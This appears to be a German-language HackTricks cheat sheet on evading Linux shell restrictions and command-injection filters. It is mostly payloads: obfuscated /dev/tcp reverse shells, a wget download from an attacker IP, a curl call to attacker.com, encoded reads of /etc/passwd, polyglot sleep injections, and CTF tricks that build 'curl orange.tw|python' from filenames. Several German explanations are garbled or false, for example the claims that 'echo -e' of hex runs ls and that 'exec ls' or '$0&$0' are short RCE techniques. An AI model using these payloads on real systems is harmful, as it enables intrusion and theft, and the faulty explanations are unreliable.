# Umgehung von Linux-Beschränkungen

<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositories senden.

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Verwenden Sie [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), um Workflows einfach zu erstellen und zu automatisieren, die von den fortschrittlichsten Community-Tools der Welt unterstützt werden.\
Erhalten Sie noch heute Zugriff:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Umgehung häufiger Beschränkungen

### Reverse Shell
```bash
# Double-Base64 is a great way to avoid bad characters like +, works 99% of the time
echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'
# echo${IFS}WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0NEx6UTBORFFnTUQ0bU1Rbz0K|ba''se''6''4${IFS}-''d|ba''se''64${IFS}-''d|b''a''s''h
```
### Kurze Rev-Shell

Eine Reverse-Shell ermöglicht es einem Angreifer, eine Verbindung zu einem verwundbaren System herzustellen und Befehle auszuführen. Hier ist eine kurze Reverse-Shell, die in der Bash-Umgebung verwendet werden kann:

```bash
bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
```

Ersetzen Sie `<IP>` durch die IP-Adresse des Angreifers und `<PORT>` durch den gewünschten Port für die Verbindung. Sobald die Reverse-Shell erfolgreich eingerichtet ist, kann der Angreifer Befehle auf dem verwundbaren System ausführen und die Kontrolle übernehmen.
```bash
#Trick from Dikline
#Get a rev shell with
(sh)0>/dev/tcp/10.10.10.10/443
#Then get the out of the rev shell executing inside of it:
exec >&0
```
### Umgehung von Pfaden und verbotenen Wörtern

In einigen Fällen kann es erforderlich sein, bestimmte Pfade oder Wörter zu umgehen, die in einer Bash-Umgebung eingeschränkt sind. Hier sind einige nützliche Techniken, um diese Einschränkungen zu umgehen:

#### 1. Verwendung von absoluten Pfaden

Anstatt relative Pfade zu verwenden, können Sie absolute Pfade angeben, um bestimmte Einschränkungen zu umgehen. Zum Beispiel:

```bash
/bin/ls
```

#### 2. Verwendung von Backslashes

Die Verwendung von Backslashes kann dazu beitragen, bestimmte Wörter zu umgehen, die in einer Bash-Umgebung verboten sind. Zum Beispiel:

```bash
echo "\b\i\n"
```

#### 3. Verwendung von Single Quotes

Die Verwendung von Single Quotes kann dazu beitragen, die Auswertung von Variablen oder Befehlen zu verhindern. Zum Beispiel:

```bash
echo 'Hello $USER'
```

#### 4. Verwendung von Shell-Escape-Sequenzen

Die Verwendung von Shell-Escape-Sequenzen kann dazu beitragen, bestimmte Einschränkungen zu umgehen. Zum Beispiel:

```bash
echo $'\x48\x65\x6c\x6c\x6f'
```

#### 5. Verwendung von Hexadezimalwerten

Die Verwendung von Hexadezimalwerten kann dazu beitragen, bestimmte Wörter zu umgehen, die in einer Bash-Umgebung verboten sind. Zum Beispiel:

```bash
echo -e "\x48\x65\x6c\x6c\x6f"
```

#### 6. Verwendung von Unicode-Zeichen

Die Verwendung von Unicode-Zeichen kann dazu beitragen, bestimmte Wörter zu umgehen, die in einer Bash-Umgebung verboten sind. Zum Beispiel:

```bash
echo $'\u0068\u0065\u006c\u006c\u006f'
```

Es ist wichtig zu beachten, dass diese Techniken je nach Umgebung variieren können. Es wird empfohlen, die spezifischen Einschränkungen und Möglichkeiten der verwendeten Bash-Umgebung zu überprüfen, um die effektivste Methode zur Umgehung von Pfaden und verbotenen Wörtern zu ermitteln.
```bash
# Question mark binary substitution
/usr/bin/p?ng # /usr/bin/ping
nma? -p 80 localhost # /usr/bin/nmap -p 80 localhost

# Wildcard(*) binary substitution
/usr/bin/who*mi # /usr/bin/whoami

# Wildcard + local directory arguments
touch -- -la # -- stops processing options after the --
ls *
echo * #List current files and folders with echo and wildcard

# [chars]
/usr/bin/n[c] # /usr/bin/nc

# Quotes
'p'i'n'g # ping
"w"h"o"a"m"i # whoami
ech''o test # echo test
ech""o test # echo test
bas''e64 # base64

#Backslashes
\u\n\a\m\e \-\a # uname -a
/\b\i\n/////s\h

# $@
who$@ami #whoami

# Transformations (case, reverse, base64)
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi") #whoami -> Upper case to lower case
$(a="WhOaMi";printf %s "${a,,}") #whoami -> transformation (only bash)
$(rev<<<'imaohw') #whoami
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==) #base64


# Execution through $0
echo whoami|$0

# Uninitialized variables: A uninitialized variable equals to null (nothing)
cat$u /etc$u/passwd$u # Use the uninitialized variable without {} before any symbol
p${u}i${u}n${u}g # Equals to ping, use {} to put the uninitialized variables between valid characters

# Fake commands
p$(u)i$(u)n$(u)g # Equals to ping but 3 errors trying to execute "u" are shown
w`u`h`u`o`u`a`u`m`u`i # Equals to whoami but 5 errors trying to execute "u" are shown

# Concatenation of strings using history
!-1 # This will be substitute by the last command executed, and !-2 by the penultimate command
mi # This will throw an error
whoa # This will throw an error
!-1!-2 # This will execute whoami
```
### Umgehung verbotener Leerzeichen

Manchmal kann es vorkommen, dass bestimmte Befehle oder Skripte aufgrund von eingeschränkten Berechtigungen oder Sicherheitsvorkehrungen nicht ausgeführt werden können. Eine gängige Einschränkung besteht darin, dass Leerzeichen in den Befehlen nicht erlaubt sind. Glücklicherweise gibt es jedoch Möglichkeiten, diese Einschränkung zu umgehen.

Eine Möglichkeit besteht darin, den Befehl in Anführungszeichen zu setzen. Dadurch wird der gesamte Befehl als einzelnes Argument behandelt und Leerzeichen werden nicht als Trennzeichen interpretiert. Zum Beispiel:

```
$ echo "Hello World"
```

Eine andere Möglichkeit besteht darin, den Befehl mit einem Backslash zu escapen. Dadurch wird das Leerzeichen als Teil des Befehls interpretiert und nicht als Trennzeichen. Zum Beispiel:

```
$ echo Hello\ World
```

Beide Methoden ermöglichen es, Befehle auszuführen, die Leerzeichen enthalten, selbst wenn diese normalerweise verboten sind. Es ist jedoch wichtig zu beachten, dass diese Techniken je nach System unterschiedlich funktionieren können. Es ist daher ratsam, verschiedene Ansätze auszuprobieren, um die beste Methode für das jeweilige System zu finden.
```bash
# {form}
{cat,lol.txt} # cat lol.txt
{echo,test} # echo test

# IFS - Internal field separator, change " " for any other character ("]" in this case)
cat${IFS}/etc/passwd # cat /etc/passwd
cat$IFS/etc/passwd # cat /etc/passwd

# Put the command line in a variable and then execute it
IFS=];b=wget]10.10.14.21:53/lol]-P]/tmp;$b
IFS=];b=cat]/etc/passwd;$b # Using 2 ";"
IFS=,;`cat<<<cat,/etc/passwd` # Using cat twice
#  Other way, just change each space for ${IFS}
echo${IFS}test

# Using hex format
X=$'cat\x20/etc/passwd'&&$X

# Using tabs
echo "ls\x09-l" | bash

# New lines
p\
i\
n\
g # These 4 lines will equal to ping

# Undefined variables and !
$u $u # This will be saved in the history and can be used as a space, please notice that the $u variable is undefined
uname!-1\-a # This equals to uname -a
```
### Umgehung von Backslash und Slash

Manchmal können bestimmte Zeichen wie der Backslash (\) oder der Slash (/) in einer Befehlszeile zu Problemen führen. Hier sind einige Möglichkeiten, wie Sie diese Beschränkungen umgehen können:

- Verwenden Sie doppelte Anführungszeichen (") um den Backslash zu maskieren. Zum Beispiel: `echo "Dies ist ein Beispiel für einen Backslash: \\"`
- Verwenden Sie ein Leerzeichen vor dem Slash, um ihn zu maskieren. Zum Beispiel: `cat Datei\ mit\ Slash`

Diese Techniken ermöglichen es Ihnen, Befehle auszuführen, die normalerweise aufgrund von Backslash- oder Slash-Beschränkungen nicht funktionieren würden.
```bash
cat ${HOME:0:1}etc${HOME:0:1}passwd
cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
```
### Umgehen von Pipes

Pipes ermöglichen die Verbindung von Befehlen in der Linux-Shell, indem sie die Ausgabe eines Befehls als Eingabe für einen anderen Befehl verwenden. Dies kann jedoch in einigen Fällen eingeschränkt sein, insbesondere wenn bestimmte Zeichen oder Befehle blockiert werden.

Um diese Beschränkungen zu umgehen, können Sie alternative Zeichen oder Befehle verwenden. Hier sind einige Beispiele:

- Verwenden Sie das Pipe-Symbol `|` in umgekehrter Reihenfolge, z.B. `|` als `|`.
- Verwenden Sie das Pipe-Symbol `|` in Unicode- oder Hexadezimaldarstellung, z.B. `|` als `&#124;` oder `|` als `0x7c`.
- Verwenden Sie alternative Befehle wie `tee` oder `grep` anstelle von `|`.

Es ist wichtig zu beachten, dass das Umgehen von Beschränkungen in einigen Fällen als Verstoß gegen die Sicherheitsrichtlinien angesehen werden kann. Stellen Sie sicher, dass Sie die erforderlichen Berechtigungen haben und die Auswirkungen Ihrer Handlungen verstehen, bevor Sie diese Techniken anwenden.
```bash
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```
### Umgehung mit hexadezimaler Codierung

Hexadezimale Codierung ist eine Methode, um Bash-Beschränkungen zu umgehen. Durch die Umwandlung von Zeichen in ihre hexadezimale Darstellung können bestimmte Beschränkungen umgangen werden.

Um eine hexadezimale Codierung zu verwenden, müssen Sie die Zeichen, die Sie umgehen möchten, in ihre hexadezimale Darstellung umwandeln. Dies kann mit dem Befehl `printf` erfolgen. Zum Beispiel wird der Buchstabe "a" in hexadezimaler Codierung als "\x61" dargestellt.

Um eine Befehlsausführung mit hexadezimaler Codierung durchzuführen, können Sie den Befehl `echo -e` verwenden. Geben Sie die hexadezimale Codierung des Befehls als Argument an. Zum Beispiel:

```
echo -e "\x6c\x73"
```

Dieser Befehl führt den Befehl `ls` aus, da die hexadezimale Codierung von "ls" "\x6c\x73" ist.

Die Verwendung der hexadezimalen Codierung kann dazu beitragen, bestimmte Bash-Beschränkungen zu umgehen und die Ausführung von Befehlen zu ermöglichen, die normalerweise blockiert wären. Es ist jedoch wichtig zu beachten, dass diese Methode nicht immer erfolgreich ist und von den spezifischen Beschränkungen des Systems abhängt.
```bash
echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat abc
`echo $'cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`
cat `xxd -r -p <<< 2f6574632f706173737764`
xxd -r -ps <(echo 2f6574632f706173737764)
cat `xxd -r -ps <(echo 2f6574632f706173737764)`
```
### Umgehung von IPs

Manchmal kann es notwendig sein, bestimmte IP-Adressen zu umgehen, um auf bestimmte Ressourcen zuzugreifen. Hier sind einige nützliche Linux-Befehle, um IP-Einschränkungen zu umgehen:

#### 1. Verwendung von Proxychains

Proxychains ist ein Tool, das es ermöglicht, den gesamten Netzwerkverkehr über einen Proxy-Server umzuleiten. Dadurch können Sie Ihre IP-Adresse verschleiern und auf Ressourcen zugreifen, die normalerweise eingeschränkt sind.

```bash
proxychains <command>
```

#### 2. Verwendung von Tor

Tor ist ein Netzwerk von Servern, das es Ihnen ermöglicht, anonym im Internet zu surfen. Sie können Tor verwenden, um Ihre IP-Adresse zu verschleiern und auf eingeschränkte Ressourcen zuzugreifen.

```bash
torsocks <command>
```

#### 3. Verwendung von VPN

Ein VPN (Virtual Private Network) ermöglicht es Ihnen, eine sichere Verbindung zu einem entfernten Netzwerk herzustellen. Durch die Verwendung eines VPNs können Sie Ihre IP-Adresse ändern und auf eingeschränkte Ressourcen zugreifen.

```bash
openvpn <config-file>
```

#### 4. Verwendung von SSH-Tunneln

SSH-Tunnel ermöglichen es Ihnen, eine sichere Verbindung zu einem entfernten Server herzustellen und den gesamten Netzwerkverkehr über diesen Server umzuleiten. Dadurch können Sie Ihre IP-Adresse verschleiern und auf eingeschränkte Ressourcen zugreifen.

```bash
ssh -D <port> <user>@<server>
```

#### 5. Verwendung von Proxys

Sie können auch Proxys verwenden, um Ihre IP-Adresse zu verschleiern und auf eingeschränkte Ressourcen zuzugreifen. Es gibt verschiedene Arten von Proxys, wie z.B. HTTP-Proxys, SOCKS-Proxys usw.

```bash
export http_proxy=<proxy-address>
export https_proxy=<proxy-address>
```

Diese Befehle ermöglichen es Ihnen, die Umgebung zu konfigurieren, um den gesamten Netzwerkverkehr über den angegebenen Proxy-Server umzuleiten.

#### 6. Verwendung von IP-Spoofing

IP-Spoofing ist eine Technik, bei der Sie Ihre IP-Adresse fälschen, um auf eingeschränkte Ressourcen zuzugreifen. Diese Technik erfordert jedoch fortgeschrittene Kenntnisse und ist in den meisten Fällen illegal.

Es ist wichtig zu beachten, dass das Umgehen von IP-Einschränkungen in vielen Fällen gegen die Nutzungsbedingungen von Diensten und Plattformen verstößt. Verwenden Sie diese Techniken daher mit Vorsicht und nur zu legitimen Zwecken.
```bash
# Decimal IPs
127.0.0.1 == 2130706433
```
### Zeitbasierte Datenexfiltration

Die zeitbasierte Datenexfiltration ist eine Methode, bei der Daten über eine Verzögerung in der Ausführung von Befehlen exfiltriert werden. Dies kann verwendet werden, um Sicherheitsbeschränkungen zu umgehen, die in einer Bash-Umgebung implementiert sind.

Um diese Technik anzuwenden, können Sie die folgenden Befehle verwenden:

- `sleep`: Verzögert die Ausführung des Befehls um eine bestimmte Anzahl von Sekunden.
- `ping`: Sendet ICMP Echo-Anforderungen an eine bestimmte IP-Adresse und erzeugt eine Verzögerung basierend auf der Round-Trip-Zeit.

Indem Sie diese Befehle in Kombination mit anderen Techniken verwenden, können Sie Daten schrittweise exfiltrieren, ohne Verdacht zu erregen. Es ist wichtig, die Verzögerungen sorgfältig zu kalibrieren, um eine zu auffällige Aktivität zu vermeiden.

Es ist jedoch zu beachten, dass diese Methode Zeit benötigt, um Daten zu exfiltrieren, und daher möglicherweise nicht für alle Szenarien geeignet ist.
```bash
time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
```
### Abrufen von Zeichen aus Umgebungsvariablen

Manchmal kann es erforderlich sein, Zeichen aus Umgebungsvariablen abzurufen, insbesondere wenn bestimmte Bash-Einschränkungen umgangen werden müssen. Hier sind einige nützliche Befehle, um dies zu erreichen:

#### 1. Verwendung von `echo` und `printf`

Sie können `echo` oder `printf` verwenden, um den Wert einer Umgebungsvariable anzuzeigen. Zum Beispiel:

```bash
echo $ENV_VARIABLE
printf "%s" $ENV_VARIABLE
```

#### 2. Verwendung von `cut`

Mit dem Befehl `cut` können Sie bestimmte Zeichen aus einer Zeichenkette extrahieren. Sie können `cut` in Kombination mit `echo` oder `printf` verwenden, um Zeichen aus einer Umgebungsvariable abzurufen. Hier ist ein Beispiel:

```bash
echo $ENV_VARIABLE | cut -c1
```

Dieser Befehl gibt das erste Zeichen der Umgebungsvariablen zurück.

#### 3. Verwendung von `grep`

`grep` kann verwendet werden, um nach bestimmten Zeichen in einer Zeichenkette zu suchen. Sie können `grep` in Kombination mit `echo` oder `printf` verwenden, um Zeichen aus einer Umgebungsvariable abzurufen. Hier ist ein Beispiel:

```bash
echo $ENV_VARIABLE | grep -o . | head -n1
```

Dieser Befehl gibt das erste Zeichen der Umgebungsvariablen zurück.

#### 4. Verwendung von `awk`

`awk` ist ein leistungsstarkes Werkzeug zum Bearbeiten von Textdateien. Sie können `awk` verwenden, um Zeichen aus einer Umgebungsvariable abzurufen. Hier ist ein Beispiel:

```bash
echo $ENV_VARIABLE | awk '{print substr($0,1,1)}'
```

Dieser Befehl gibt das erste Zeichen der Umgebungsvariablen zurück.

Es ist wichtig zu beachten, dass diese Befehle nur dann funktionieren, wenn die Umgebungsvariable den gewünschten Wert enthält. Stellen Sie sicher, dass Sie die Umgebungsvariable überprüfen, bevor Sie versuchen, Zeichen daraus abzurufen.
```bash
echo ${LS_COLORS:10:1} #;
echo ${PATH:0:1} #/
```
### DNS-Datenexfiltration

Sie könnten beispielsweise **burpcollab** oder [**pingb**](http://pingb.in) verwenden.

### Eingebaute Funktionen

Falls Sie keine externen Funktionen ausführen können und nur Zugriff auf einen **begrenzten Satz von eingebauten Funktionen zur Erlangung von RCE** haben, gibt es einige nützliche Tricks, um dies zu erreichen. Normalerweise **können Sie nicht alle** der **eingebauten Funktionen** verwenden, daher sollten Sie **alle Ihre Optionen kennen**, um zu versuchen, das Gefängnis zu umgehen. Idee von [**devploit**](https://twitter.com/devploit).\
Überprüfen Sie zuerst alle [**Shell-Builtins**](https://www.gnu.org/software/bash/manual/html\_node/Shell-Builtin-Commands.html)**.** Hier sind einige **Empfehlungen**:
```bash
# Get list of builtins
declare builtins

# In these cases PATH won't be set, so you can try to set it
PATH="/bin" /bin/ls
export PATH="/bin"
declare PATH="/bin"
SHELL=/bin/bash

# Hex
$(echo -e "\x2f\x62\x69\x6e\x2f\x6c\x73")
$(echo -e "\x2f\x62\x69\x6e\x2f\x6c\x73")

# Input
read aaa; exec $aaa #Read more commands to execute and execute them
read aaa; eval $aaa

# Get "/" char using printf and env vars
printf %.1s "$PWD"
## Execute /bin/ls
$(printf %.1s "$PWD")bin$(printf %.1s "$PWD")ls
## To get several letters you can use a combination of printf and
declare
declare functions
declare historywords

# Read flag in current dir
source f*
flag.txt:1: command not found: CTF{asdasdasd}

# Read file with read
while read -r line; do echo $line; done < /etc/passwd

# Get env variables
declare

# Get history
history
declare history
declare historywords

# Disable special builtins chars so you can abuse them as scripts
[ #[: ']' expected
## Disable "[" as builtin and enable it as script
enable -n [
echo -e '#!/bin/bash\necho "hello!"' > /tmp/[
chmod +x [
export PATH=/tmp:$PATH
if [ "a" ]; then echo 1; fi # Will print hello!
```
### Polyglot-Befehlsspritzung

Polyglot-Befehlsspritzung bezieht sich auf die Verwendung eines einzigen Befehls, der in mehreren Programmiersprachen gültig ist. Dies ermöglicht es einem Angreifer, Befehle auszuführen, die normalerweise durch Sicherheitsvorkehrungen wie Blacklisting von bestimmten Zeichen oder Wörtern blockiert werden.

Ein Polyglot-Befehl kann in verschiedenen Kontexten verwendet werden, einschließlich der Umgehung von Bash-Einschränkungen. Dies kann nützlich sein, um Sicherheitsmaßnahmen zu umgehen und unerlaubte Aktionen auf einem Linux-System auszuführen.

Es ist wichtig zu beachten, dass Polyglot-Befehlsspritzung eine fortgeschrittene Technik ist und ein tiefes Verständnis der Programmiersprachen erfordert, um sie effektiv einzusetzen. Es ist auch wichtig, dass ein Angreifer die potenziellen Auswirkungen und Risiken versteht, die mit der Verwendung dieser Technik verbunden sind.
```bash
1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
```
### Umgehung potenzieller Regexes

Manchmal können bestimmte Befehle oder Funktionen durch reguläre Ausdrücke (Regexes) eingeschränkt werden. Hier sind einige Möglichkeiten, wie Sie diese Einschränkungen umgehen können:

- Verwenden Sie alternative Befehle oder Funktionen, die nicht durch die Regexes eingeschränkt sind.
- Ändern Sie den Befehl oder die Funktion so, dass er nicht mehr mit der Regex übereinstimmt.
- Umgehen Sie die Regex, indem Sie spezielle Zeichen oder Escape-Sequenzen verwenden.

Es ist wichtig zu beachten, dass das Umgehen von Regexes möglicherweise gegen die Sicherheitsrichtlinien oder -bestimmungen verstößt. Verwenden Sie diese Techniken daher nur in legitimen Szenarien und mit Zustimmung des Eigentümers des Systems.
```bash
# A regex that only allow letters and numbers might be vulnerable to new line characters
1%0a`curl http://attacker.com`
```
### Bashfuscator

Bashfuscator ist ein Tool, das entwickelt wurde, um Bash-Skripte zu verschleiern und die Erkennung von Sicherheitsmechanismen zu umgehen. Es verwendet verschiedene Techniken, um den Code schwer lesbar zu machen und somit die Analyse und Erkennung von bösartigem Verhalten zu erschweren.

#### Verwendung

Die Verwendung von Bashfuscator ist einfach. Führen Sie einfach das Bash-Skript aus, das Sie verschleiern möchten, und geben Sie den Ausgabepfad für das verschleierte Skript an. Das Tool wird den Code automatisch verschleiern und eine neue Datei mit dem verschleierten Skript erstellen.

```bash
bashfuscator -i <input_script> -o <output_script>
```

#### Techniken

Bashfuscator verwendet verschiedene Techniken, um den Code zu verschleiern. Dazu gehören:

- **Variablenumbenennung**: Das Tool ändert die Namen von Variablen, um den Code schwerer verständlich zu machen.
- **Code-Flussänderung**: Bashfuscator fügt zusätzlichen Code ein, um den Fluss des Skripts zu ändern und die Analyse zu erschweren.
- **String-Verschleierung**: Der Tool verschleiert Zeichenketten, um sie schwerer lesbar zu machen.
- **Whitespace-Einfügung**: Bashfuscator fügt zusätzliche Leerzeichen und Zeilenumbrüche ein, um den Code schwerer lesbar zu machen.

#### Vorsichtsmaßnahmen

Obwohl Bashfuscator dazu dient, Bash-Skripte zu verschleiern, ist es wichtig zu beachten, dass dies keine Garantie für absolute Sicherheit bietet. Es kann immer noch möglich sein, den verschleierten Code zu analysieren und bösartiges Verhalten zu erkennen. Daher sollten zusätzliche Sicherheitsmaßnahmen ergriffen werden, um die Sicherheit von Systemen zu gewährleisten.
```bash
# From https://github.com/Bashfuscator/Bashfuscator
./bashfuscator -c 'cat /etc/passwd'
```
### RCE mit 5 Zeichen

Es gibt eine Technik, um eine Remote Code Execution (RCE) mit nur 5 Zeichen in einer Bash-Umgebung zu erreichen. Diese Technik umgeht die Einschränkungen, die normalerweise in einer eingeschränkten Bash-Shell gelten.

Die Technik besteht darin, den Befehl `exec` zu verwenden, gefolgt von einem Leerzeichen und dem gewünschten Befehl. Dies ermöglicht es uns, beliebigen Code auszuführen.

Hier ist ein Beispiel, wie dies funktioniert:

```bash
exec ls
```

Dieser Befehl führt den Befehl `ls` aus und gibt das Ergebnis auf der Konsole aus. Sie können jeden beliebigen Befehl anstelle von `ls` verwenden, um Code auszuführen.

Es ist wichtig zu beachten, dass diese Technik nur in bestimmten Szenarien funktioniert, in denen die `exec`-Funktion nicht eingeschränkt ist. In einer sicheren Umgebung oder in einer Umgebung mit eingeschränkten Berechtigungen kann diese Technik möglicherweise nicht funktionieren.

Es ist auch wichtig zu beachten, dass das Ausführen von Code ohne die entsprechenden Berechtigungen illegal sein kann. Stellen Sie sicher, dass Sie die geltenden Gesetze und Richtlinien einhalten, wenn Sie diese Technik verwenden.
```bash
# From the Organge Tsai BabyFirst Revenge challenge: https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge
#Oragnge Tsai solution
## Step 1: generate `ls -t>g` to file "_" to be able to execute ls ordening names by cration date
http://host/?cmd=>ls\
http://host/?cmd=ls>_
http://host/?cmd=>\ \
http://host/?cmd=>-t\
http://host/?cmd=>\>g
http://host/?cmd=ls>>_

## Step2: generate `curl orange.tw|python` to file "g"
## by creating the necesary filenames and writting that content to file "g" executing the previous generated file
http://host/?cmd=>on
http://host/?cmd=>th\
http://host/?cmd=>py\
http://host/?cmd=>\|\
http://host/?cmd=>tw\
http://host/?cmd=>e.\
http://host/?cmd=>ng\
http://host/?cmd=>ra\
http://host/?cmd=>o\
http://host/?cmd=>\ \
http://host/?cmd=>rl\
http://host/?cmd=>cu\
http://host/?cmd=sh _
# Note that a "\" char is added at the end of each filename because "ls" will add a new line between filenames whenwritting to the file

## Finally execute the file "g"
http://host/?cmd=sh g


# Another solution from https://infosec.rm-it.de/2017/11/06/hitcon-2017-ctf-babyfirst-revenge/
# Instead of writing scripts to a file, create an alphabetically ordered the command and execute it with "*"
https://infosec.rm-it.de/2017/11/06/hitcon-2017-ctf-babyfirst-revenge/
## Execute tar command over a folder
http://52.199.204.34/?cmd=>tar
http://52.199.204.34/?cmd=>zcf
http://52.199.204.34/?cmd=>zzz
http://52.199.204.34/?cmd=*%20/h*

# Another curiosity if you can read files of the current folder
ln /f*
## If there is a file /flag.txt that will create a hard link
## to it in the current folder
```
### RCE mit 4 Zeichen

Es gibt eine Technik, um eine Remote Code Execution (RCE) mit nur 4 Zeichen in einer Bash-Umgebung zu erreichen. Diese Technik nutzt die Kombination von Shell-Befehlen und Shell-Metazeichen, um die Bash-Beschränkungen zu umgehen.

Die folgende Sequenz von 4 Zeichen ermöglicht es, eine RCE zu erreichen:

```bash
$0&$0
```

Dieser Befehl nutzt den Shell-Befehl `$0`, der den Namen des aktuellen Skripts oder der aktuellen Shell enthält. Durch die Verwendung des Metazeichens `&` wird der Befehl in den Hintergrund verschoben, während `$0` erneut ausgeführt wird.

Diese Technik kann verwendet werden, um die Bash-Beschränkungen zu umgehen und eine RCE in einer verwundbaren Umgebung zu erreichen. Es ist jedoch wichtig zu beachten, dass diese Technik nur in bestimmten Szenarien funktioniert und von den Sicherheitsvorkehrungen der Zielumgebung abhängt.
```bash
# In a similar fashion to the previous bypass this one just need 4 chars to execute commands
# it will follow the same principle of creating the command `ls -t>g` in a file
# and then generate the full command in filenames
# generate "g> ht- sl" to file "v"
'>dir'
'>sl'
'>g\>'
'>ht-'
'*>v'

# reverse file "v" to file "x", content "ls -th >g"
'>rev'
'*v>x'

# generate "curl orange.tw|python;"
'>\;\\'
'>on\\'
'>th\\'
'>py\\'
'>\|\\'
'>tw\\'
'>e.\\'
'>ng\\'
'>ra\\'
'>o\\'
'>\ \\'
'>rl\\'
'>cu\\'

# got shell
'sh x'
'sh g'
```
## Bypass von Read-Only/Noexec/Distroless

Wenn Sie sich in einem Dateisystem mit den Schutzmaßnahmen **read-only und noexec** oder sogar in einem distroless Container befinden, gibt es immer noch Möglichkeiten, **beliebige Binärdateien auszuführen, sogar eine Shell!:**

{% content-ref url="../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/" %}
[bypass-fs-protections-read-only-no-exec-distroless](../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/)
{% endcontent-ref %}

## Chroot & andere Jails Bypass

{% content-ref url="../privilege-escalation/escaping-from-limited-bash.md" %}
[escaping-from-limited-bash.md](../privilege-escalation/escaping-from-limited-bash.md)
{% endcontent-ref %}

## Referenzen & Mehr

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
* [https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
* [https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
* [https://www.secjuice.com/web-application-firewall-waf-evasion/](https://www.secjuice.com/web-application-firewall-waf-evasion/)

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Verwenden Sie [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), um Workflows einfach zu erstellen und zu automatisieren, die von den fortschrittlichsten Community-Tools der Welt unterstützt werden.\
Erhalten Sie noch heute Zugriff:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>
